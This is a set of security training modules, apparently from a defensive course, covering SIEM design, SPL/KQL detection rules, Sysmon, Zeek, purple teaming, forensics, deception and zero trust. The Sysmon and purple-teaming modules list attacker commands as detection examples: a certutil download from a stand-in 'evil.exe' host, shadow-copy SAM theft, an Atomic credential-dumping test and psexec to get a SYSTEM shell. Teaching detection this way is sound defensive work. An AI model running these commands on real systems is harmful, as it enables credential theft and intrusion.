[
    {
        "id": "b-31",
        "content": "# SIEM Architecture & Log Engineering\n\n## 1. Orientation\n\n### What this module covers\nA Security Information and Event Management (SIEM) system is the central brain of the SOC. It aggregates logs from everywhere. This module covers **Ingestion**, **Normalization**, and **Retention**.\n\n### Learning Objectives\n*   Design a **Logging Pipeline** (Shipper -> Buffer -> Indexer -> Search Head).\n*   Understand **Normalization** (CIM/ECS).\n*   Calculate **EPS** (Events Per Second) and storage costs.\n\n---\n\n## 2. Core Content\n\n### The Pipeline\n1.  **Generation:** The App/Firewall creates the log.\n2.  **Collection (Shipper):** Fluentd/Logstash/Splunk UF reads the log.\n3.  **Buffering:** Kafka/Redis queues the logs (to prevent data loss during spikes).\n4.  **Indexing:** The SIEM parses and stores the text for searching.\n\n### Normalization (The Babel Fish)\nEvery vendor formats logs differently.\n*   *Cisco firewall:* `src_ip=1.2.3.4`\n*   *Windows Event:* `SourceAddress=1.2.3.4`\n*   *Problem:* You can't search consistently.\n*   *Solution:* **Common Information Model (CIM)**. Rename all fields to `src_ip` at ingest time. Now one query searches Windows, Linux, and Cisco simultaneously.\n\n### Storage Tiers\n*   **Hot:** SSD. Searchable in milliseconds. Expensive. Keep for 30 days.\n*   **Warm:** HDD. Searchable. Keep for 90 days.\n*   **Cold:** Archived/Tape. Not immediately searchable. Keep for Compliance (1-7 years).\n\n---\n\n## 3. Lab: The Parser\n\n### Scenario\nRaw Log: `2024-01-01 Failed login for user admin from 10.0.0.1`\n\n**Goal:** Extract fields.\n\n**Regex (Splunk Style):**\n`^\\d{4}-\\d{2}-\\d{2}\\s(?<action>.*)\\sfor user\\s(?<user>\\w+)\\sfrom\\s(?<src_ip>[\\d\\.]+)`\n\n**Normalized Output:**\n{\n  \"action\": \"Failed login\",\n  \"user\": \"admin\",\n  \"src_ip\": \"10.0.0.1\"\n}\n\n---\n\n## 4. Reflection\n1.  Why is \"Timestamp Parsing\" the most critical step? (If the SIEM guesses the wrong year or timezone, your logs might appear in the future or past, making correlation impossible).\n2.  What is \"Filter at Source\"? (Dropping useless debug logs at the agent level to save network bandwidth and storage license costs).\n"
    },
    {
        "id": "b-32",
        "content": "# Detection Engineering (SPL & KQL)\n\n## 1. Orientation\n\n### What this module covers\nSearching for \"Error\" is not detection. Detection Engineering is writing code to identify specific threat behaviors. This module covers **Search Processing Language (SPL)** and **Kusto Query Language (KQL)**.\n\n### Learning Objectives\n*   Write a query to detect **Brute Force** attacks.\n*   Understand **Precision vs. Recall** in rules.\n*   Implement **Thresholding** and **Time Windows**.\n\n---\n\n## 2. Core Content\n\n### Anatomy of a Rule\n1.  **Selection:** Filter data. `index=windows EventCode=4625` (Failed Login).\n2.  **Aggregation:** Group by criteria. `| stats count by src_ip, user`.\n3.  **Threshold:** Set a limit. `| where count > 10`.\n4.  **Timeframe:** `earliest=-15m`.\n\n### Precision vs. Recall\n*   **Precision:** How many alerts are real? (High precision = Low False Positives).\n*   **Recall:** How many attacks did we catch? (High recall = Low False Negatives).\n*   *Tradeoff:* Tighter rules increase Precision but lower Recall (you might miss a slow brute force).\n\n### SPL Example (Splunk)\n```splunk\nindex=main sourcetype=access_combined status=200\n| stats count by client_ip, uri_path\n| where count > 1000\n| sort -count\n```\n*Detects High-Volume Scraping/Fuzzing.*\n\n---\n\n## 3. Lab: Detecting Password Spraying\n\n### Scenario\nAttack: Trying *one* password against *many* users (avoids lockout).\n\n**Logic:**\n1.  Look for Failed Logins (`4625`).\n2.  Group by `src_ip`.\n3.  Count distinct `user` names (`dc(user)`).\n4.  Trigger if `unique_users > 20` in 10 minutes.\n\n**KQL (Sentinel):**\n```kql\nSecurityEvent\n| where EventID == 4625\n| summarize UserCount = dcount(TargetAccount) by IpAddress, bin(TimeGenerated, 10m)\n| where UserCount > 20\n```\n\n---\n\n## 4. Reflection\n1.  Why use `bin(TimeGenerated, 10m)`? (To look for bursts of activity. A subtle attacker stretches the attack over 24 hours to evade this rule).\n2.  What is an \"Allow List\"? (Exceptions within the rule code, e.g., `| where src_ip != '10.0.0.5'` (Scanner). Managing these is a nightmare).\n"
    },
    {
        "id": "b-33",
        "content": "# Endpoint Telemetry (Sysmon & EDR)\n\n## 1. Orientation\n\n### What this module covers\nLogs tell you *what* happened. Telemetry tells you *how*. Sysmon (System Monitor) provides deep visibility into Windows internals (Process creation, Network connections, Driver loads).\n\n### Learning Objectives\n*   Install and Config **Sysmon**.\n*   Analyze **Process Trees** (Parent-Child relationships).\n*   Detect **Living off the Land** binaries (LOLBins).\n\n---\n\n## 2. Core Content\n\n### Sysmon Capabilities\nStandard Event Logs show \"Audit Failure\". Sysmon shows:\n*   **Event 1:** Process Creation (Command Line arguments, Parent Process, Hash).\n*   **Event 3:** Network Connection (Src/Dst IP, Port, Process that made the call).\n*   **Event 11:** File Create (Did Word.exe drop a .exe?).\n\n### The Process Tree\nMalware rarely appears out of nowhere. It is spawned.\n*   **Normal:** `explorer.exe` -> `chrome.exe`.\n*   **Suspect:** `winword.exe` -> `cmd.exe` (Macro exploit).\n*   **Critical:** `tomcat.exe` -> `whoami.exe` (Webshell RCE).\n\n### LOLBins\nAttackers use built-in tools to hide.\n*   *Certutil:* Download files (`certutil -urlcache -f http://evil.exe`).\n*   *Mshta:* Execute scripts.\n*   *Rundll32:* Load malicious DLLs.\n\n---\n\n## 3. Lab: Hunting the Webshell\n\n### Scenario\nWeb Server (IIS) is compromised.\n\n**Sysmon Query:**\n`EventID=1 AND ParentImage=\"*w3wp.exe\"` (`w3wp` is the IIS worker process).\n\n**Results:**\n1.  `w3wp.exe` -> `ping.exe` (Recon).\n2.  `w3wp.exe` -> `net user add` (Persistence).\n3.  `w3wp.exe` -> `powershell.exe` (Payload).\n\n**Verdict:** RCE confirmed. The web app is vulnerable.\n\n---\n\n## 4. Reflection\n1.  Why is Command Line logging important? (Seeing `powershell.exe` is useless. Seeing `powershell.exe -enc aGVsbG8...` reveals the script contents).\n2.  What is \"Process Hollowing\"? (Malware starts a legit process like `notepad.exe`, pauses it, replaces its memory with malicious code, and resumes it. EDR detects this via memory scanning).\n"
    },
    {
        "id": "b-34",
        "content": "# Network Security Monitoring (Zeek)\n\n## 1. Orientation\n\n### What this module covers\nNetwork logs are the source of truth. You can delete logs on a host, but you can't delete the packets you sent. This module covers **Zeek (formerly Bro)** and analyzing network metadata.\n\n### Learning Objectives\n*   Differentiate between **PCAP** (Full Packet) and **Flow Data** (Metadata).\n*   Analyze `conn.log`, `dns.log`, and `http.log`.\n*   Detect **Beaconing** and **Data Exfiltration** via DNS.\n\n---\n\n## 2. Core Content\n\n### PCAP vs Flow\n*   **PCAP:** Every byte. (Huge storage. Encrypted payloads are unreadable). 100% fidelity.\n*   **Zeek Logs:** Compact metadata. \"IP A talked to IP B on Port 80 for 5 seconds, sent 500 bytes, GET /index.html\". (Small storage, high value).\n\n### Key Zeek Logs\n*   **conn.log:** The handshake. Duration. Byte count. (Detects port scans, long connections).\n*   **dns.log:** Queries. (Detects DGA domains, tunneling).\n*   **http.log:** User Agents, URIs. (Detects unencrypted C2, weird User Agents).\n*   **ssl.log:** Certificate details. (Detects self-signed certs used by malware).\n\n### JA3 Fingerprinting\nA way to fingerprint the SSL Client Hello packet. Even if traffic is encrypted, the *way* the client initiates the handshake (ciphers, extensions) is unique. \n*   *Use Case:* Identify specific malware families (like Trickbot) based on their JA3 hash, regardless of IP.\n\n---\n\n## 3. Lab: DNS Tunneling\n\n### Scenario\nAn internal host is querying `dominion-updates.com` thousands of times.\n\n**Log Analysis (dns.log):**\n*   QTYPE: `TXT` (Rare for normal traffic).\n*   Query: `a8f93...base64...dominion-updates.com`.\n*   Answer: `x9d1...`.\n\n**Conclusion:** The attacker is encoding data in the DNS queries and receiving commands in the DNS responses. This builds a C2 channel that bypasses firewalls (which usually allow DNS).\n\n---\n\n## 4. Reflection\n1.  Why not just record full PCAP for everything? (Cost. Storing 10Gbps of traffic requires Petabytes. Zeek logs are 1/1000th the size).\n2.  Can Zeek see inside HTTPS? (No. But it logs the SNI (Server Name Indication) and Certificate metadata, which is often enough to identify the destination).\n"
    },
    {
        "id": "b-35",
        "content": "# Purple Teaming & Emulation\n\n## 1. Orientation\n\n### What this module covers\nHow do you know your detections work? You simulate the attack. **Purple Teaming** is the collaboration of Red (Attack) and Blue (Defend). We will use **Atomic Red Team** to execute controlled tests.\n\n### Learning Objectives\n*   Execute an **Atomic Test** (T1003 - OS Credential Dumping).\n*   Validate **Log Coverage** and **Alert Triggering**.\n*   Calculate **Detection Rate**.\n\n---\n\n## 2. Core Content\n\n### The Cycle\n1.  **Select Technique:** MITRE T1003 (Credential Dumping).\n2.  **Execute (Red):** Run `vssadmin create shadow /for=C:` (Ways to steal SAM database).\n3.  **Hunt (Blue):** Did the SIEM see it? Did the EDR block it?\n4.  **Tune:** If missed, write a new correlation rule.\n5.  **Repeat:** Run it again to verify the fix.\n\n### Atomic Red Team\nA library of simple, scripted attacks (YAML).\n*   *Command:* `Invoke-AtomicTest T1003.002`\n*   *Action:* It runs the specific command to dump registry hives.\n*   *Cleanup:* It deletes the files it created.\n\n### BAS (Breach and Attack Simulation)\nEnterprise tools (like Caldera, Scythe) that automate this at scale, running thousands of attacks daily to detect regression.\n\n---\n\n## 3. Lab: Testing the Defense\n\n### Scenario\nYou wrote a rule to detect `whoami` when run by `SYSTEM`.\n\n1.  **Test:** Open CMD as Admin. Run `whoami`.\n    *   *Result:* No Alert. (Because you ran it as Admin, not SYSTEM).\n2.  **Refine Test:** Use `psexec -s -i cmd.exe` to get a SYSTEM shell. Run `whoami`.\n    *   *Result:* Alert Fired.\n3.  **Validation:** The rule works for the intended threat (Webshell/Service Exploit).\n\n---\n\n## 4. Reflection\n1.  Why is this better than a real pentest? (A pentest is once a year. Purple Teaming is continuous. It specifically tests your *detections*, whereas a pentester just wants to get in).\n2.  What is \"Detection Drift\"? (When a rule stops working because the environment changedâ€”e.g., logging was disabled during an upgrade and never turned back on. BAS detects this).\n"
    },
    {
        "id": "b-36",
        "content": "# Digital Forensics for Engineers\n\n## 1. Orientation\n\n### What this module covers\nWhen an alert triggers, you need to investigate. Forensics is the art of recovering evidence. This module covers **Order of Volatility**, **Triage Collection**, and **Artifacts**.\n\n### Learning Objectives\n*   Follow the **Order of Volatility** (Memory -> Disk -> Backup).\n*   Collect **KAPE** triage packages.\n*   Analyze **Prefetch**, **Shimcache**, and **Amcache**.\n\n---\n\n## 2. Core Content\n\n### Order of Volatility\nCapture the most fleeting data first.\n1.  **CPU/Cache:** Gone in nanoseconds.\n2.  **RAM:** Gone on reboot. (Contains encryption keys, unencrypted passwords, running processes).\n3.  **HDD/SSD:** Persistent.\n4.  **Backups:** Long-term.\n\n### Evidence of Execution\nHow do you prove a program ran?\n*   **Prefetch:** Windows creates `.pf` files to speed up loading. Contains run count and last run time.\n*   **Shimcache (AppCompatCache):** Tracks executables for compatibility. detailed history of execution.\n*   **UserAssist:** Registry key tracking GUI programs launched by a user.\n\n### Triage vs. Deadbox\n*   **Deadbox:** Imaging the entire 1TB drive (Slow, legally rigorous).\n*   **Triage:** Collecting the key 500MB of artifacts (Registry, Event Logs, MFT). Fast. Use **KAPE** (Kroll Artifact Parser and Extractor).\n\n---\n\n## 3. Lab: Shadow Copy Analysis\n\n### Scenario\nRansomware deleted the original files. You need to see what existed *before*.\n\n1.  **List Shadows:** `vssadmin list shadows`.\n2.  **Mount Shadow:** Create a symlink to the backup snapshot.\n3.  **Explore:** Browse the C: drive as it was 24 hours ago.\n4.  **Recover:** Copy the malware sample (which deleted itself) from the snapshot for analysis.\n\n---\n\n## 4. Reflection\n1.  Why must you never reboot a compromised machine? (You destroy the RAM evidenceman. Pause/Suspend the VM instead).\n2.  What is the \"Chain of Custody\"? (A log of exactly who touched the evidence and when. Essential if the case goes to court).\n"
    },
    {
        "id": "b-37",
        "content": "# Deception Technology\n\n## 1. Orientation\n\n### What this module covers\nReverse the asymmetry. Make the attacker afraid to touch anything. Deception involves planting fake users, files, and systems (**Honeypots**) that trigger high-fidelity alerts when touched.\n\n### Learning Objectives\n*   Deploy **Honeytokens** (Fake AWS Keys, Canary Files).\n*   Understand **Active Defense**.\n*   Integrate Deception into the SIEM.\n\n---\n\n## 2. Core Content\n\n### Types of Deception\n1.  **Honeytoken (Credential):** A fake AWS Access Key left in a code repo. If anyone tries to use it -> Alert.\n2.  **Honeyfile:** `Passwords.xls` on a desktop. If opened -> Alert.\n3.  **Honeypot (System):** A fake SSH server. If logged into -> Alert.\n\n### The Psychology\nDeception increases the attacker's **Dwell Time** (waste their time) and forces them to move slower (fear of detection).\n\n### CanaryTokens\nA free tool (Thinkst Canary) to generate tokens.\n*   *Web Bug:* A URL. If visited, you get an email with the IP/User Agent.\n*   *DNS Token:* A hostname. If resolved, you get an alert.\n\n---\n\n## 3. Lab: The Canary in the Coal Mine\n\n### Scenario\nYou want to detect if an attacker is browsing a File Share.\n\n1.  **Create:** A folder `\\\\Share\\Finance\\Salaries`.\n2.  **Plant:** A `Desktop.ini` file with a custom icon path pointing to a Canary DNS token.\n3.  **Trigger:** When Windows Explorer renders the folder, it tries to fetch the icon. It resolves the DNS.\n4.  **Alert:** \"Someone browsed the Salaries folder from IP X.\"\n\n---\n\n## 4. Reflection\n1.  What is the False Positive rate of a Honeytoken? (Near Zero. No legitimate user has a reason to use a fake AWS key found in a hidden folder).\n2.  Can honeypots be dangerous? (Yes, if you fail to isolate them. An attacker could use a compromised honeypot as a jump box to attack real systems).\n"
    },
    {
        "id": "b-38",
        "content": "# Zero Trust Architecture (ZTA)\n\n## 1. Orientation\n\n### What this module covers\n\"Trust but Verify\" is dead. Zero Trust means \"Never Trust, Always Verify.\" It moves the perimeter from the Network to the **Identity**. This module covers **BeyondCorp**, **Micro-segmentation**, and **Continuous Auth**.\n\n### Learning Objectives\n*   Define the 3 Pillars: **Identity**, **Device Health**, **Policy**.\n*   Implement **Identity Aware Proxy (IAP)**.\n*   Move away from VPNs.\n\n---\n\n## 2. Core Content\n\n### The Old Model (Castle & Moat)\nOnce you VPN in, you can touch everything. Malware on your laptop spreads laterally.\n\n### The Zero Trust Model\nEvery request is authenticated and authorized.\n\n**The Decision Engine:**\nUser Alice wants to access App B.\n1.  **Who is she?** (MFA ok?).\n2.  **What device?** (Corporate Laptop? Patched? EDR running?).\n3.  **Where is she?** (Geo-IP ok?).\n4.  **Policy:** Alice is allowed to see App B.\n**Result:** Proxy grants access for *this request only*.\n\n### Micro-segmentation\nStopping lateral movement. Server A cannot talk to Server B unless explicitly allowed by policy (mTLS), even if they are on the same subnet.\n\n---\n\n## 3. Lab: Conditional Access\n\n### Scenario\nConfigure a Conditional Access Policy (Azure AD / Okta).\n\n1.  **Target:** Engineering Wiki.\n2.  **Condition 1:** User Group = Engineers.\n3.  **Condition 2:** Device State = Compliant (Intune registered + BitLocker on).\n4.  **Grant:** Access.\n5.  **Test:** Try accessing from personal phone.\n    *   *Result:* Blocked. \"Device not managed.\"\n\n---\n\n## 4. Reflection\n1.  Why causes \"MFA Fatigue\"? (Spamming the user with push notifications until they click \"Approve\" just to make it stop. Zero Trust adds context to prevent this necessity).\n2.  Is Zero Trust a product? (No. It's a strategy. You can't \"Buy Zero Trust\". You build it using IAM, EDR, and Proxies).\n"
    },
    {
        "id": "b-40",
        "content": "# Builder Capstone: Secure Architecture Design\n\n## 1. Orientation\n\n### What this module covers\nThis is the final exam for the Builder Path. You will design a secure banking infrastructure from the ground up, applying everything from IaC, Cloud, DevSecOps, and Detection.\n\n### Learning Objectives\n*   Design a **Defense-in-Depth** architecture.\n*   Map controls to **NIST CSF** (Identify, Protect, Detect, Respond, Recover).\n*   Produce a **Threat Model**.\n\n---\n\n## 2. Core Content\n\n### The Requirements\n**Client:** NeoBank.\n**Workload:** Kubernetes Microservices.\n**Data:** PII and Financial Transactions.\n**Access:** Remote Engineers, Mobile App Users.\n\n### The Architecture Layering\n1.  **Network:** Hub-and-Spoke VNETs. WAF (Web Application Firewall) at edge. 3-Tier Private Subnets.\n2.  **Compute:** GKE/EKS Clusters. Distroless detection. OPA (Open Policy Agent) Gatekeeper.\n3.  **Pipeline:** Github Actions. Signed Commits. Image Scanning (Trivy). SLSA Level 3.\n4.  **Identity:** Zero Trust Access to internal tools. MFA everywhere.\n5.  **Data:** Envelope Encryption (KMS). Database Activity Monitoring.\n6.  **Observability:** Central SIEM. Sysmon on Nodes. CloudTrail enabled.\n\n### Threat Modeling (STRIDE)\n*   **S**poofing: Mitigated by mTLS.\n*   **T**ampering: Mitigated by Immutable Infrastructure.\n*   **R**epudiation: Mitigated by Centralized Logging.\n*   **I**nformation Disclosure: Mitigated by Encryption.\n*   **D**enial of Service: Mitigated by Autoscaling + DDOS Shield.\n*   **E**levation of Privilege: Mitigated by Least Privilege (RBAC).\n\n---\n\n## 3. Lab: The Defense Review\n\n### Task\nReview the proposed diagram.\n\n**Finding 1:** Database is Publicly Accessible.\n*   *Fix:* Move to Private Subnet. Use PrivateLink.\n**Finding 2:** Devs SSH into Prod.\n*   *Fix:* Remove SSH. Use SSM Session Manager / Ephemeral Access.\n**Finding 3:** Secrets stored in Git.\n*   *Fix:* Migrate to HashiCorp Vault / AWS Secrets Manager.\n\n---\n\n## 4. Final Words\nSecurity Engineering is about enabling the business to run fast, safely. You are not the \"Department of No\". You are the \"Department of How\". Go build.\n"
    }
]